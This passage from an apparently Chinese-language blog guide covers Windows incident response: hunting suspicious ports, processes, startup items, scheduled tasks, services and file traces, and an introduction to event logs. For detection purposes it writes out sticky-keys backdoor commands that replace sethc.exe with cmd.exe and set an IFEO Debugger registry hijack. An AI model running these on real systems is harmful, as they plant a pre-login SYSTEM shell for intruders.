image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211051937925.png" data-fancybox="true"/></div></div></li></ol><h3 id="检查异常端口、进程"><a href="#检查异常端口、进程" class="headerlink" title="检查异常端口、进程"></a>检查异常端口、进程</h3><ol><li><p>检查端口连接情况,是否有远程连接、可疑连接.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检查方法:</span></span><br><span class="line"><span class="comment"># 注意以下状态的网络连接：</span></span><br><span class="line">   - ESTABLISHED: 连接建立数据传输</span><br><span class="line">   - LISTEN: 监听中等待连接</span><br><span class="line">a. netstat -ano</span><br><span class="line">b. 根据netstat定位出的pid,再通过tasklist命令进行进程定位</span><br><span class="line">tasklist | findstr <span class="string">&quot;PID&quot;</span></span><br><span class="line"><span class="comment"># 注册表查看RDP端口.</span></span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407041914044.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407090750697.png" data-fancybox="true"/></div></div><p><code>Tcpview</code>、火绒剑、命令行下<code>netstat -ano</code>：</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202306261931794.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202306261940016.png" data-fancybox="true"/></div></div><p><code>DNSQuerySniffer</code>：DNS解析查询工具。可以通过此工具确定访问恶意域名的端口号,该工具还可以将主机访问过的所有域名记录下来。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202306261944205.png" data-fancybox="true"/></div></div></li><li><p>进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检查方法:</span></span><br><span class="line">a. 开始--运行--输入</span><br><span class="line">msinfo32</span><br><span class="line">依次点击<span class="string">&quot;软件环境→正在运行任务&quot;</span>就可以查看到进程的详细信息,比如进程路径、进程ID、文件创建日期、启动时间等.</span><br><span class="line">b. 打开D盾查杀工具,进程查看,关注没有签名信息的进程.</span><br><span class="line">c. 通过微软官方提供的ProcessExplorer等工具进行排查.</span><br><span class="line">d. 查看可疑的进程及其子进程.可以通过观察以下内容:</span><br><span class="line">1. 没有签名验证信息的进程</span><br><span class="line">2. 没有描述信息的进程</span><br><span class="line">3. 进程的属主</span><br><span class="line">4. 进程的路径是否合法</span><br><span class="line">5. CPU或内存资源占用长时间过高的进程</span><br></pre></td></tr></table></figure></li><li><p>小技巧:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">a. 查看端口对应的PID: netstat -ano | findstr <span class="string">&quot;port&quot;</span></span><br><span class="line">b. 查看进程对应的PID: 任务管理器--查看--选择列--PID</span><br><span class="line">或者 tasklist | findstr <span class="string">&quot;PID&quot;</span></span><br><span class="line">c. 查看进程对应的程序位置:</span><br><span class="line">1. 任务管理器--选择对应进程--右键打开文件位置</span><br><span class="line"> 2. cmd输入wmic process</span><br><span class="line">d. tasklist /svc  <span class="comment"># 进程--PID--服务</span></span><br><span class="line">e. 查看Windows服务所对应的端口:</span><br><span class="line">   %system%/system32/drivers/etc/services</span><br><span class="line"><span class="comment"># 一般 %system% 就是C:\Windows</span></span><br><span class="line">f. <span class="comment"># 查询对应进程的详细信息</span></span><br><span class="line"><span class="comment"># 进程的标题或名称,进程启动时使用的命令行,创建进程的类的名称,进程创建的日期和时间,客户端超级计算机的创建类名（通常与 CreationClassName 相同）,计算机的名称,进程的描述,进程的可执行文件路径,进程的执行状态（例如：正在运行、停止等）,进程句柄的十六进制表示,进程当前打开的句柄数量,安装日期,进程在内核模式下运行的总时间,进程可使用的最大工作集大小（内存页数）,进程可使用的最小工作集大小（内存页数）,进程的名称,操作系统创建的类的名称,操作系统的名称,其他操作计数,其他传输计数,进程引起的页面错误次数,进程使用的页面文件大小,创建此进程的父进程的ID</span></span><br><span class="line"><span class="comment"># Caption,CommandLine,CreationClassName,CreationDate,CSCreationClassName,CSName,Description,ExecutablePath,ExecutionState,Handle,HandleCount,InstallDate,KernelModeTime,MaximumWorkingSetSize,MinimumWorkingSetSize,Name,OSCreationClassName,OSName,OtherOperationCount,OtherTransferCount,PageFaults,PageFileUsage,ParentProcessId</span></span><br><span class="line"></span><br><span class="line">wmic process get Caption,CommandLine,ExecutablePath,InstallDate,Name,ProcessId /format:csv | findstr <span class="string">&quot;phpstudy&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># format:</span></span><br><span class="line"><span class="comment"># /FORMAT:CSV          逗号分隔值格式</span></span><br><span class="line"><span class="comment"># /FORMAT:HTML         超文本标记语言格式</span></span><br><span class="line"><span class="comment"># /FORMAT:LIST         以列表形式输出（默认格式）</span></span><br><span class="line"><span class="comment"># /FORMAT:MOF          管理对象格式</span></span><br><span class="line"><span class="comment"># /FORMAT:RAWXML       原始XML格式</span></span><br><span class="line"><span class="comment"># /FORMAT:TABLE        以表格形式输出</span></span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407140837080.png" data-fancybox="true"/></div></div></li><li><p>WinRM端口复用连接排查</p><ul><li><p>在默认情况下,WinRM服务的端口为5985,但可通过配置将其改成80端口</p></li><li><p>在排查时,可使用命令<code>winrm enumerate winrm/config/listener</code>查看是否启动服务,当存在返回信息时,则说明服务运行中,当无返回信息时,则服务关闭</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211072213355.png" data-fancybox="true"/></div></div></li><li><p>关闭服务命令</p><ul><li><p>cmd:<code>winrm delete winrm/config/Listener?Address=*+Transport=HTTP</code></p></li><li><p>powershell</p><ul><li><code>Set-Service -Name winrm -StartupType Disabled</code></li><li><code>Stop-Service winrm</code></li></ul></li></ul></li></ul></li></ol><h3 id="检查启动项、计划任务、服务"><a href="#检查启动项、计划任务、服务" class="headerlink" title="检查启动项、计划任务、服务"></a>检查启动项、计划任务、服务</h3><blockquote><p>什么是Windows启动项？</p><ul><li>开机的时候系统会在前台或者后台运行的程序</li></ul><p>什么是Windows启动项后门？</p><p>Windows启动项后门也是攻击者常用的权限维持方式，大体上可以分为两种。</p><ul><li>一是重启电脑时自启动后门程序实现权限维持；</li><li>二是点击某应用、服务、程序时自启动后门程序实现权限维持。</li></ul><p>什么是计划任务？</p><ul><li>一般是指在操作系统中设置定时任务</li><li>计划任务是系统的常见功能，利用任务计划功能，可以将任何脚本、程序或文档安排在某个最方便的时间运行。</li></ul><p>什么是计划任务后门？</p><ul><li>计划任务是经常被攻击者拿来利用的控制点，计划任务可以让目标主机在特定的时间执行我们预先准备的后门程序从而帮助我们进行权限维持。</li></ul><p>什么是Windows服务？</p><ul><li>Windows 会话中可运行的可执行应用程序</li><li>在Windows系统中还有一个重要的机制，就是服务。通常大部分的服务都拥有SYSTEM权限，如果攻击者利用Windows的服务机制创建一个后门服务，那么这个后门将比一般的持久化方法更为强健。</li></ul></blockquote><ol><li><p>检查服务器是否有异常的启动项</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检查方法:</span></span><br><span class="line">a. 登录服务器,单击【开始】&gt;【所有程序】&gt;【启动】,默认情况下此目录在是一个空目录,</span><br><span class="line">确认是否有非业务程序在该目录下.</span><br><span class="line">b. 单击开始菜单&gt;【运行】,输入msconfig,查看是否存在命名异常的启动项目,</span><br><span class="line">是则取消勾选命名异常的启动项目,并到命令中显示的路径删除文件.</span><br><span class="line">c. 单击【开始】&gt;【运行】,输入regedit,打开注册表,</span><br><span class="line">查看开机启动项是否正常,特别注意如下注册表项:</span><br><span class="line"> HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line"> HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</span><br><span class="line"> HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</span><br><span class="line"> HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</span><br><span class="line"> HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run</span><br><span class="line"> HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line"> HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line"> HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</span><br><span class="line"> HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</span><br><span class="line"> (ProfilePath)\Start Menu\Programs\Startup 启动项</span><br><span class="line">检查右侧是否有启动异常的项目,如有请删除,并建议安装杀毒软件进行病毒查杀,清除残留病毒或木马.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注册表目录含义</span></span><br><span class="line"><span class="comment"># 此处存储的信息可确保在Windows资源管理器中执行时打开正确的程序.它还包含有关拖放规则、快捷方法和用户界面信息的更多详细信息</span></span><br><span class="line">HKEY_CLASSES_ROOT(HKCR)</span><br><span class="line"><span class="comment"># 包含当前登录系统的用户的配置信息，有用户的文件夹、屏幕颜色和控制面板设置</span></span><br><span class="line">HKEY_CLASSES_USER(HKCU)</span><br><span class="line"><span class="comment"># 包含运行操作系统的计算机硬件特定信息，有系统上安装的驱动器列表及已安装硬件和应用程序的通用配置</span></span><br><span class="line">HKEY_LOCAL_MACHINE(HKLM)</span><br><span class="line"><span class="comment"># 包含系统上所有用户配置文件的配置信息，有应用程序配置和可视配置</span></span><br><span class="line">HKEY_USERS(HKU)</span><br><span class="line"><span class="comment"># 存储有关系统当前配置的信息</span></span><br><span class="line">HKEY_CLASSES_CONFIG(HCU)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注册表操作命令</span></span><br><span class="line">1. reg add添加注册表</span><br><span class="line">2. reg delete删除注册表</span><br><span class="line">3. reg query返回注册表的子项下的项和下一层项的列表</span><br><span class="line"></span><br><span class="line">d. 利用安全软件查看启动项、开机时间管理等.</span><br><span class="line">e. 组策略,运行gpedit.msc.</span><br><span class="line">f. msconfig 图形化查看启动项</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407041918644.png" data-fancybox="true"/></div></div><p><code>autoruns</code>:检查启动项、计划任务、服务最推荐的工具。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202306261959492.png" data-fancybox="true"/></div></div><p>WMI后门：无文件,相对来说难以排查,但也可以使用<code>autoruns</code>排查。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202306262000594.png" data-fancybox="true"/></div></div></li><li><p>检查计划任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检查方法:</span></span><br><span class="line">a. 单击【开始】&gt;【设置】&gt;【控制面板】&gt;【任务计划】</span><br><span class="line">查看计划任务属性,便可以发现木马文件的路径.</span><br><span class="line">b. taskschd.msc</span><br><span class="line">c. compmgmt.msc</span><br><span class="line">d. schtasks</span><br><span class="line">e. powershell输入Get-ScheduledTask</span><br><span class="line">f. C:\Windows\System32\Tasks\</span><br><span class="line">g. C:\Windows\SysWOW64\Tasks\</span><br><span class="line">h. C:\Windows\tasks\</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407041919997.png" data-fancybox="true"/></div></div></li><li><p>服务自启动</p><blockquote><p>服务可以理解为运行在后台的进程，这些服务可以在计算机启动时自动启动，也可以暂停和重新启动，而且不显示任何用户界面</p><p>服务作为一种运行在后台的进程，是恶意软件常用的贮存方法</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检查方法:</span></span><br><span class="line">单击【开始】&gt;【运行】,输入services.msc,注意服务状态和启动类型</span><br><span class="line">检查是否有异常服务.</span><br></pre></td></tr></table></figure></li></ol><h3 id="进程分析"><a href="#进程分析" class="headerlink" title="进程分析"></a>进程分析</h3><blockquote><p>Windows进程排查，主要是找到恶意进程的PID，程序路径有时还需要找到PPID(PID的父进程)，及程序加载的DLL</p></blockquote><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> 任务管理器</span><br><span class="line"><span class="bullet">2.</span> tasklist命令</span><br><span class="line"><span class="bullet">1.</span> tasklist /svc 查看进程服务</span><br><span class="line"><span class="bullet">2.</span> tasklist /m 查看加载dll的恶意进程</span><br><span class="line"><span class="bullet">3.</span> tasklist /m dll文件名 指定dll的调用情况</span><br><span class="line"><span class="bullet">4.</span> tasklist过滤器  tasklist /fi &#x27;pid eq 992&#x27; eq表示等于</span><br><span class="line"><span class="bullet">5.</span> 可以先使用netstat -ano查看端口连接信息，然后使用tasklist | findstr进行排查</span><br><span class="line"><span class="bullet">3.</span> powershell</span><br><span class="line"><span class="bullet">1.</span> 用途在存在守护进程的进程，确认子父进程的关系</span><br><span class="line"><span class="bullet">2.</span> Get-WmiObject Win32<span class="emphasis">_Process | select Name,ProcessId,ParentProcessId,Path</span></span><br><span class="line"><span class="emphasis">4. wmic命令</span></span><br><span class="line"><span class="emphasis">1. 以csv格式列出所有信息</span></span><br><span class="line"><span class="emphasis">      wmic process list full /format:csv</span></span><br><span class="line"><span class="emphasis">2. 以csv格式显示进程的名称、父进程ID、进程ID  </span></span><br><span class="line"><span class="emphasis">      wmic process get name，parentprocessid，processid /format:csv</span></span><br></pre></td></tr></table></figure><p>主要注意点大致就是：<strong>没有厂商名字</strong>、没有<strong>签名验证信息</strong>、没有<strong>描述信息</strong>的可疑进程。还有典型的挖矿现象(CPU 或内存资源占用长时间过高)的进程。</p><p>​<code>Pchunter</code>：黑色为微软官方进程,蓝色为外界安装软件进程,红色为可疑进程,同时注意进程参数<br>​<div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202306261956364.png" data-fancybox="true"/></div></div><br>​<code>process Explorer</code>:进程浏览器。界面功能从左到右为：<code>Process进程</code>、<code>CPU占比</code>、<code>Private Bytes提交大小</code>、<code>Working Set(工作设置、内存)</code>、<code>PID</code>、<code>Description描述</code>、<code>Company Name</code>公司名。<br>​小技巧：被注入的进程属性里会多出<code>.NET Assemblies</code> 和 <code>.NET Performance</code>两个菜单<br>​<div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202306261957571.png" data-fancybox="true"/></div></div></p><h3 id="文件痕迹排查"><a href="#文件痕迹排查" class="headerlink" title="文件痕迹排查"></a>文件痕迹排查</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> 敏感目录</span><br><span class="line"><span class="bullet">1.</span> 各个盘符的tmp/temp相关目录  恶意程序投放的文件一般都会在路径相对统一的文件夹下，而临时目录相对统一</span><br><span class="line"><span class="bullet">2.</span> 浏览器记录:人工入侵事件，入侵者会下载后续入侵的相关工具</span><br><span class="line"><span class="bullet">3.</span> Recent文件 位置：Everything全盘搜索即可 Recent文件主要存储了最近运行文件的快捷方式，可通过分析最近运行的文件，排查可疑文件</span><br><span class="line"><span class="bullet">4.</span> Prefetch预读取文件夹 位置：%SystemRoot%\Prefetch\ 用来存放系统已访问过的文件的预读取信息，扩展名位pf</span><br><span class="line"><span class="bullet">5.</span> Amcache.hve文件可以查询应用程序的执行路径、上次执行的时间以及SHA1值</span><br><span class="line"><span class="bullet">2.</span> 时间查找</span><br><span class="line"><span class="bullet">1.</span> 简介：安全事件发生后，需要确认事件发生的时间点，然后排查时间点前后文件变动情况，缩小排查范围</span><br><span class="line"><span class="bullet">2.</span> 列出攻击日期内新增的文件，从而发现相关的恶意软件 </span><br><span class="line"><span class="bullet">1.</span> forfiles命令查找对应条件的文件</span><br><span class="line"><span class="bullet">2.</span> 使用everything对该时间段的文件进行排查</span><br><span class="line"><span class="bullet">3.</span> 对文件的创建时间、修改时间、访问时间进行排查 查看文件属性，查看创建时间和修改时间是否存在逻辑上的问题，如果存在则该文件需要重点排查</span><br><span class="line"><span class="bullet">3.</span> webshell使用D盾、HwsKill、WebShellKill等webshell扫描工具进行扫描</span><br></pre></td></tr></table></figure><h3 id="辅助功能镜像劫持-Shift粘贴键后门"><a href="#辅助功能镜像劫持-Shift粘贴键后门" class="headerlink" title="辅助功能镜像劫持-Shift粘贴键后门"></a>辅助功能镜像劫持-Shift粘贴键后门</h3><blockquote><p>什么是Shift粘贴键后门？</p><ul><li>Shift粘滞键是当用户连按5次shift就会自动弹出的一个程序，其实不光是粘滞键，还有各种辅助功能，这类辅助功能都拥有一个特点就是当用户未进行登录时也可以触发。所以攻击者很有可能通过篡改这些辅助功能的指向程序来达到权限维持的目的。    （辅助功能镜像劫持是一样的原理）</li></ul></blockquote><p>为了使电脑更易于使用和访问，Windows 添加了一些辅助功能。这些功能可以在用户登录之前以组合键启动。根据这个特征，一些恶意软件无需登录到系统，通过远程桌面协议就可以执行恶意代码。<br>比如最常见的按5下shift出现的粘滞键Sethc.exe，还有Windows + U组合键时启动的utilman.exe程序<br>还有:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">屏幕键盘: C:\Windows\System32\osk.exe</span><br><span class="line">放大镜: C:\Windows\System32\Magnify.exe</span><br><span class="line">旁白: C:\Windows\System32\Narrator.exe</span><br><span class="line">显示切换器 C:\Windows\System32\DisplaySwitch.exe</span><br><span class="line">应用切换器: C:\Windows\System32\AtBroker.exe</span><br></pre></td></tr></table></figure><h4 id="低版本"><a href="#低版本" class="headerlink" title="低版本"></a>低版本</h4><p>在较早的 Windows 版本，只需要进行简单的二进制文件替换，比如经典的shift后门是将<code>C:\Windows\System32\sethc.exe</code>替换为<code>cmd.exe</code>。<br>仅限<mark class="tag-plugin colorful mark" color="warning">windows 2003、xp系统</mark></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy c:\windows\system32\sethc.exe c:\windows\system32\sethc.exe.bak</span><br><span class="line">copy c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211051833790.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211051838034.png" data-fancybox="true"/></div></div><h4 id="高版本"><a href="#高版本" class="headerlink" title="高版本"></a>高版本</h4><p>我们需要用到IFEO,即映像劫持</p><h5 id="什么是IFEO"><a href="#什么是IFEO" class="headerlink" title="什么是IFEO"></a>什么是IFEO</h5><p>所谓的IFEO就是Image File Execution Options，直译过来就是映像劫持。它又被称为“重定向劫持”（Redirection Hijack），它和“映像劫持”（Image Hijack，或IFEO Hijack）只是称呼不同，实际上都是一样的技术手段。白话来讲就是做某个操作的时候被拦截下来，干了别的事。</p><p>当我们双击运行程序时，系统会查询该IFEO注册表，如果发现存在和该程序名称完全相同的子键，就查询对应子健中包含的“debugger”键值名，如果该参数不为空，系统则会把 Debugger 参数里指定的程序文件名作为用户试图启动的程序执行请求来处理。这样成功执行的是遭到“劫持”的虚假程序。</p><h5 id="命令行修改"><a href="#命令行修改" class="headerlink" title="命令行修改"></a>命令行修改</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 需要管理员权限</span></span><br><span class="line"><span class="comment"># 在以下注册表中的sethc.exe项添加一个Debugger字符值（REG_SZ），并且赋值为cmd.exe的执行路径为C:\windows\system32\cmd.exe，如图:</span></span><br><span class="line">REG ADD <span class="string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot;</span> /v Debugger /t REG_SZ /d <span class="string">&quot;C:\windows\system32\cmd.exe&quot;</span></span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211051903959.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211051903552.png" data-fancybox="true"/></div></div><h2 id="0x02-Windows日志及工具"><a href="#0x02-Windows日志及工具" class="headerlink" title="0x02 Windows日志及工具"></a>0x02 Windows日志及工具</h2><h3 id="Windows日志介绍"><a href="#Windows日志介绍" class="headerlink" title="Windows日志介绍"></a>Windows日志介绍</h3><p>依赖的服务：EventLog服务</p><p>位置:</p><ul><li><p>Windows 2000 &#x2F; Server2003 &#x2F; Windows XP ：<code>%SystemRoot%\System32\Config\*.evtx</code></p></li><li><p>Windows Vista &#x2F; 7 &#x2F; 10 &#x2F; Server2008 及以上版本： <code>%SystemRoot%\System32\Winevt\Logs\*.evtx</code></p></li></ul><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407041951100.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407041951181.png" data-fancybox="true"/></div></div><h3 id="Windows日志分类"><a href="#Windows日志分类" class="headerlink" title="Windows日志分类"></a>Windows日志分类</h3><table><thead><tr><th>类型</th><th>描述</th></tr></thead><tbody><tr><td>系统日志（System.evtx）</td><td>系统日志包含由Windows系统组件记录的事件，记录系统进程和设备 驱动程序的活动。由它审核的系统事件包括启动失败的设备驱动程序、硬件错误、重复的IP地址 以及服务启动、暂停和停止。</td></tr><tr><td>应用程序日志（Application.evtx）</td><td>记录程序在运行过程中的日志信息。</td></tr><tr><td><mark class="tag-plugin colorful mark" color="red">安全日志（Security.evtx)</mark></td><td><mark class="tag-plugin colorful mark" color="red">安全日志记录各种系统审核和安全处理，包括用户权限的变化、文件 和目录的访问、打印以及用户系统登陆和注销，如有效或无效的登陆尝试、与资源使用有关的事 件。管理员有按需要指定安全日志中要记录的事件类型。</mark></td></tr></tbody></table><h4 id="系统日志"><a href="#系统日志" class="headerlink" title="系统日志"></a>系统日志</h4><blockquote><p>简介：主要指Windows系统中的各个组件在运行中产生的各种事件</p><ol><li>系统驱动在运行中出现的问题</li><li>操作系统的多种组件在运行中出现的各种问题</li><li>应用软件在运行中出现的重大问题</li></ol><p>问题包括：数据丢失、错误，以及系统崩溃行为</p></blockquote><ol><li><code>Windows2000-WindowsServer2003</code>:<code>C:\WINDOWS\System32\config\SysEvent.evt</code></li><li><code>WindowsVista-Win10以及WindowsServer2008</code>:<code>%SystemRoot%\System32\Winevt\Logs\System.evt</code></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 分析方法:</span></span><br><span class="line">a. 前提:开启审核策略,若日后系统出现故障、安全事故则可以查看系统的日志文件,排除故障,追查入侵者的信息等.</span><br><span class="line">b. Win+R打开运行,输入<span class="string">&quot;eventvwr.msc&quot;</span>,回车运行,打开<span class="string">&quot;事件查看器&quot;</span>.</span><br><span class="line">C. 导出应用程序日志、安全日志、系统日志,利用LogParser进行分析.</span><br></pre></td></tr></table></figure><h4 id="安全日志"><a href="#安全日志" class="headerlink" title="安全日志"></a>安全日志</h4><blockquote><p>简介：记录系统各种安全事件</p><ol><li>各种登录与退出系统的成功或不成功的信息</li><li>对系统中各种重要资源的操作，如对系统文件的创建、删除、修改等操作</li></ol></blockquote><ol><li><code>Windows2000-WindowsServer2003</code>:<code>C:\WINDOWS\System32\config\SecEvent.evt</code></li><li><code>WindowsVista-Win10以及WindowsServer2008</code>:<code>%SystemRoot%\System32\Winevt\Logs\Security.evt</code></li></ol><h4 id="应用程序日志"><a href="#应用程序日志" class="headerlink" title="应用程序日志"></a>应用程序日志</h4><blockquote><p>简介：各类应用程序产生的各类事件:登录、退出等日志</p></blockquote><ol><li><code>Windows2000-WindowsServer2003</code>:<code>C:\WINDOWS\System32\config\AppEvent.evt</code></li><li><code>WindowsVista-Win10以及WindowsServer2008</code>:<code>%SystemRoot%\System32\Winevt\Logs\Application.evt</code></li></ol><mark class="tag-plugin colorful mark" color="warning">在默认情况下， Windows日志仅仅记录一些特定日志，因为Windows日志中每种日志的大小默认为 20M，超过大小之后会覆盖最早的日志记录。如果我们需要记录详细的安全日志，则需要通过修改本地策略或者在高级审核策略配置中来启用其他项的日志记录功能。</mark><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407041952119.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407041953325.png" data-fancybox="true"/></div></div><h3 id="Windows事件ID"><a href="#Windows事件ID" class="headerlink" title="Windows事件ID"></a>Windows事件ID</h3><h4 id="审核策略更改"><a href="#审核策略更改" class="headerlink" title="审核策略更改"></a>审核策略更改</h4><blockquote><p>此安全设置确定 OS 是否对尝试更改用户权限分 配策略、审核策略、帐户策略或信任策略的每 一个实例进行审核.</p></blockquote><table><thead><tr><th align="center">类别</th><th align="center">子类别</th><th align="center">默认状态</th><th align="center">对应高级审核策略配置</th></tr></thead><tbody><tr><td align="center">审核策略更改</td><td align="center">审核审核策略更改</td><td align="center">成功</td><td align="center">策略更改</td></tr><tr><td align="center"></td><td align="center">审核身份验证策略更改</td><td align="center">成功</td><td align="center">策略更改</td></tr><tr><td align="center"></td><td align="center">审核授权策略更改</td><td align="center">无审核</td><td align="center">策略更改</td></tr><tr><td align="center"></td><td align="center">审核筛选平台策略更改</td><td align="center">无审核</td><td align="center">策略更改</td></tr><tr><td align="center"></td><td align="center">审核 MPSSVC 规则级策略更改</td><td align="center">无审核</td><td align="center">策略更改</td></tr><tr><td align="center"></td><td align="center">审核其他策略更改事件</td><td align="center">无审核</td><td 